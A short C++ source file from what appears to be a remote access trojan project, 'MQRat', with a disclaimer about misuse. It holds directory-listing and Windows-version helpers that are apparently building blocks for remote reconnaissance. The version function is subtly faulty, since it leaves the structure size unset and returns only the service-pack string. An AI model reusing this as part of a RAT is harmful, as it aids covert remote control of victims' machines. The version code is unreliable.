/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <iostream>
#include <filesystem>
#include "api.hpp"
#include "fs.hpp"

using namespace std;

vector<string> API::FileSystem::ListFiles()
{
    vector<string> file_list;
    string path = ".";

    for(auto entry : filesystem::directory_iterator(path)) {
        auto filename = entry.path().filename().generic_string();
        file_list.push_back(filename);
    }

    return file_list;
}

std::string API::FileSystem::GetWindowsVersion()
{
    OSVERSIONINFOA version;

    if(GetVersionExA(&version)) {
        return string(version.szCSDVersion);
    }

    return "";
}
